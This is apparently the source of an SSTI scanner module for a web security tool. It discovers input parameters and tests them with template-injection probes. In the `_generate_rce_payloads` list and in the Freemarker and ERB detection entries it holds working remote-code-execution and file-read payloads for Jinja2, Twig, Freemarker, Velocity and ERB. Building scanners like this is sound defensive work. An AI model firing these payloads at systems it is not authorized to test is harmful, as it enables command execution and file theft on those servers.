"""
SSTI (Server-Side Template Injection) Scanner module - Advanced Implementation.
"""

import logging
from collections.abc import Callable
from typing import Any

from .base_scanner import BaseScanner, Vulnerability

logger = logging.getLogger(__name__)


class SSTIScanner(BaseScanner):
    """Advanced SSTI (Server-Side Template Injection) vulnerability detection engine."""

    def __init__(self, config, http_client):
        super().__init__(config, http_client)
        self.name = "SSTIScanner"
        self.description = "Advanced SSTI detector for Jinja2, Twig, Freemarker, Velocity, Smarty, and more"
        self.version = "1.0.0"
        self.capabilities = [
            "Jinja2/Flask Detection",
            "Twig Detection",
            "Freemarker Detection",
            "Velocity Detection",
            "Smarty Detection",
            "ERB (Ruby) Detection",
            "Pebble Detection",
            "RCE Payload Generation",
        ]

        # Template engine detection payloads
        self.detection_payloads = self._generate_detection_payloads()

        # RCE exploitation payloads
        self.rce_payloads = self._generate_rce_payloads()

    def _generate_detection_payloads(self) -> list[dict[str, Any]]:
        """Generate SSTI detection payloads for various engines."""
        return [
            # Universal detection
            {
                "name": "Universal Math",
                "payload": "{{7*7}}",
                "expected": "49",
                "engine": "Multiple",
                "severity": "high",
            },
            {
                "name": "Universal Math Alt",
                "payload": "${7*7}",
                "expected": "49",
                "engine": "Multiple",
                "severity": "high",
            },
            {
                "name": "Universal Concat",
                "payload": "{{'a'.'b'}}",
                "expected": "ab",
                "engine": "Twig",
                "severity": "high",
            },
            # Jinja2 / Flask
            {
                "name": "Jinja2 Detection",
                "payload": "{{config}}",
                "expected": ["Config", "SECRET_KEY", "DEBUG"],
                "engine": "Jinja2/Flask",
                "severity": "critical",
            },
            {
                "name": "Jinja2 Class",
                "payload": '{{"".__class__}}',
                "expected": ["<class 'str'>", "__class__"],
                "engine": "Jinja2/Flask",
                "severity": "critical",
            },
            {
                "name": "Jinja2 Request",
                "payload": "{{request}}",
                "expected": ["Request", "environ", "args"],
                "engine": "Jinja2/Flask",
                "severity": "high",
            },
            # Twig (PHP)
            {
                "name": "Twig Detection",
                "payload": "{{_self}}",
                "expected": ["Template", "Twig", "__toString"],
                "engine": "Twig",
                "severity": "critical",
            },
            {
                "name": "Twig Env",
                "payload": "{{_self.env}}",
                "expected": ["Environment", "Twig"],
                "engine": "Twig",
                "severity": "critical",
            },
            # Freemarker (Java)
            {
                "name": "Freemarker Detection",
                "payload": "${.version}",
                "expected": ["2.", "Freemarker"],
                "engine": "Freemarker",
                "severity": "critical",
            },
            {
                "name": "Freemarker Class",
                "payload": '<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}',
                "expected": ["uid=", "gid="],
                "engine": "Freemarker",
                "severity": "critical",
            },
            # Velocity (Java)
            {
                "name": "Velocity Detection",
                "payload": "#set($x=7*7)$x",
                "expected": "49",
                "engine": "Velocity",
                "severity": "high",
            },
            {
                "name": "Velocity Class",
                "payload": '$class.inspect("java.lang.Runtime")',
                "expected": ["Runtime", "java.lang"],
                "engine": "Velocity",
                "severity": "critical",
            },
            # Smarty (PHP)
            {
                "name": "Smarty Detection",
                "payload": '{php}echo "SSTI";{/php}',
                "expected": "SSTI",
                "engine": "Smarty",
                "severity": "critical",
            },
            {
                "name": "Smarty Math",
                "payload": '{math equation="7*7"}',
                "expected": "49",
                "engine": "Smarty",
                "severity": "high",
            },
            # ERB (Ruby)
            {"name": "ERB Detection", "payload": "<%= 7*7 %>", "expected": "49", "engine": "ERB", "severity": "high"},
            {
                "name": "ERB System",
                "payload": '<%= system("id") %>',
                "expected": ["uid=", "gid="],
                "engine": "ERB",
                "severity": "critical",
            },
            # Pebble (Java)
            {
                "name": "Pebble Detection",
                "payload": "{{ 7*7 }}",
                "expected": "49",
                "engine": "Pebble",
                "severity": "high",
            },
            # Mako (Python)
            {"name": "Mako Detection", "payload": "${7*7}", "expected": "49", "engine": "Mako", "severity": "high"},
            # Razor (.NET)
            {"name": "Razor Detection", "payload": "@(7*7)", "expected": "49", "engine": "Razor", "severity": "high"},
        ]

    def _generate_rce_payloads(self) -> list[dict[str, Any]]:
        """Generate RCE payloads for confirmed SSTI."""
        return [
            # Jinja2 RCE
            {
                "engine": "Jinja2/Flask",
                "payload": """{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}""",
                "description": "Jinja2 file read via class traversal",
            },
            {
                "engine": "Jinja2/Flask",
                "payload": """{{config.__class__.__init__.__globals__['os'].popen('id').read()}}""",
                "description": "Jinja2 RCE via config globals",
            },
            # Twig RCE
            {
                "engine": "Twig",
                "payload": """{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}""",
                "description": "Twig RCE via filter callback",
            },
            # Freemarker RCE
            {
                "engine": "Freemarker",
                "payload": """<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}""",
                "description": "Freemarker RCE via Execute utility",
            },
            # Velocity RCE
            {
                "engine": "Velocity",
                "payload": """#set($rt=$class.forName("java.lang.Runtime"))#set($r=$rt.getRuntime())$r.exec("id")""",
                "description": "Velocity RCE via Runtime",
            },
        ]

    async def scan(self, url: str, progress_callback: Callable | None = None) -> dict[str, Any]:
        """Perform comprehensive SSTI vulnerability scan."""
        logger.info(f"Scanning {url} for SSTI vulnerabilities")
        vulnerabilities = []

        try:
            self._update_progress(progress_callback, 10, "Discovering input parameters")

            # 1. Discover parameters
            discovered_params = await self._discover_parameters(url)

            # 2. Get form parameters
            response = await self.http_client.get(url)
            if response:
                html = await response.text()
                soup = await self._parse_html(html)
                form_params = self._extract_form_params(soup)
                discovered_params.extend(form_params)

            discovered_params = list(set(discovered_params))

            if not discovered_params:
                discovered_params = ["q", "search", "name", "template", "page", "id", "input"]

            total_tests = len(discovered_params) * len(self.detection_payloads)
            processed = 0
            detected_engines = {}

            # 3. Test each parameter with detection payloads
            for param in discovered_params[:15]:  # Limit params
                for payload_info in self.detection_payloads:
                    processed += 1
                    progress = 20 + int((processed / total_tests) * 60)

                    if processed % 10 == 0:
                        self._update_progress(
                            progress_callback, progress, f"Testing {param} - {payload_info['engine']}"
                        )

                    vulns = await self._test_ssti_payload(url, param, payload_info)

                    if vulns:
                        vulnerabilities.extend(vulns)
                        detected_engines[param] = payload_info["engine"]
                        break  # Move to next param

            # 4. Test RCE on confirmed vulnerable params
            if detected_engines:
                self._update_progress(progress_callback, 85, "Testing RCE payloads")
                for param, engine in detected_engines.items():
                    rce_vulns = await self._test_rce_payload(url, param, engine)
                    vulnerabilities.extend(rce_vulns)

            self._update_progress(progress_callback, 100, "completed")

            status = "Vulnerable" if vulnerabilities else "Secure"
            details = f"Tested {len(discovered_params)} parameters. Found {len(vulnerabilities)} SSTI issues."
            return self._format_result(status, details, vulnerabilities)

        except Exception as e:
            logger.exception(f"SSTI scan failed: {e}")
            return self._format_result("Error", f"Internal error: {e}", [])

    def _extract_form_params(self, soup) -> list[str]:
        """Extract parameter names from forms."""
        params = []
        forms = soup.find_all("form")
        for form in forms:
            inputs = form.find_all(["input", "textarea", "select"])
            for inp in inputs:
                name = inp.get("name")
                if name:
                    params.append(name)
        return params

    async def _test_ssti_payload(self, url: str, param: str, payload_info: dict[str, Any]) -> list[Vulnerability]:
        """Test a specific SSTI payload."""
        findings = []

        try:
            # Test GET
            response = await self._test_payload(url, param, payload_info["payload"], "GET")

            if self._is_ssti_vulnerable(response, payload_info["expected"]):
                findings.append(self._create_ssti_vulnerability(param, payload_info, "GET", response))
                return findings

            # Test POST
            response = await self._test_payload(url, param, payload_info["payload"], "POST")

            if self._is_ssti_vulnerable(response, payload_info["expected"]):
                findings.append(self._create_ssti_vulnerability(param, payload_info, "POST", response))

        except Exception as e:
            logger.debug(f"SSTI test error: {e}")

        return findings

    def _is_ssti_vulnerable(self, response: dict, expected: Any) -> bool:
        """Check if response indicates SSTI vulnerability."""
        if not response:
            return False

        content = response.get("page_content", "")

        if isinstance(expected, str):
            return expected in content
        elif isinstance(expected, list):
            return any(exp in content for exp in expected)

        return False

    def _create_ssti_vulnerability(self, param: str, payload_info: dict, method: str, response: dict) -> Vulnerability:
        """Create SSTI vulnerability object."""
        return self._create_vulnerability(
            title=f"SSTI Vulnerability: {payload_info['engine']} ({payload_info['name']})",
            description=f"Server-Side Template Injection detected in parameter '{param}'. Engine: {payload_info['engine']}. This can lead to Remote Code Execution.",
            severity=payload_info["severity"],
            type=f"ssti_{payload_info['engine'].lower().replace('/', '_')}",
            evidence={
                "param": param,
                "engine": payload_info["engine"],
                "payload": payload_info["payload"],
                "method": method,
                "response_snippet": response.get("page_content", "")[:300],
            },
            cwe_id="CWE-94",
            remediation="Never pass user input directly to template engines. Use sandboxed template rendering. Implement strict input validation.",
        )

    async def _test_rce_payload(self, url: str, param: str, engine: str) -> list[Vulnerability]:
        """Test RCE payloads for confirmed vulnerable parameter."""
        findings = []

        rce_payloads = [p for p in self.rce_payloads if p["engine"] == engine]

        for rce_info in rce_payloads[:2]:  # Limit RCE tests
            try:
                response = await self._test_payload(url, param, rce_info["payload"], "GET")

                if response:
                    content = response.get("page_content", "")
                    if any(x in content for x in ["uid=", "gid=", "root:", "nobody:"]):
                        findings.append(
                            self._create_vulnerability(
                                title=f"SSTI RCE Confirmed: {engine}",
                                description=f"Remote Code Execution achieved via SSTI in parameter '{param}'. {rce_info['description']}",
                                severity="critical",
                                type="ssti_rce",
                                evidence={"param": param, "engine": engine, "rce_type": rce_info["description"]},
                                cwe_id="CWE-94",
                                remediation="This is a critical vulnerability requiring immediate remediation. Remove user input from template processing.",
                            )
                        )
                        break

            except Exception as e:
                logger.debug(f"RCE test error: {e}")

        return findings
